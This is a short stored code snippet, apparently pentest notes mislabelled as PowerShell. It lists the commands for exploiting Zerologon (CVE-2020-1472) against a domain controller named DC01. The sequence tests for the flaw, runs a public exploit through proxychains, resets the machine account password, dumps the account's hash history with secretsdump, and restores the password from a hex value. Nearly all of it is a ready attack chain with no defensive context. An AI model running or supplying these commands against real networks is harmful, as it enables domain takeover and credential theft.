---
id: 854b8bbd-4c40-431d-b67f-4b5fce0a6dee
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:02.672741+00:00'
updated_at: '2023-04-10T20:36:01.279000+00:00'
---

# Code Snippet 854b8bbd

**Language**: Powershell

```powershell
  # Check (https://github.com/SecuraBV/CVE-2020-1472)
  proxychains python3 zerologon_tester.py DC01 172.16.1.5
  
$ git clone https://github.com/dirkjanm/CVE-2020-1472.git

# Activate a virtual env to install impacket
$ python3 -m venv venv
$ source venv/bin/activate
$ pip3 install .
  
# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5

# Find the old NT hash of the DC
proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'

# Restore password from secretsdump 
# secretsdump will automatically dump the plaintext machine password (hex encoded) 
# when dumping the local registry secrets on the newest version
python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
deactivate
```


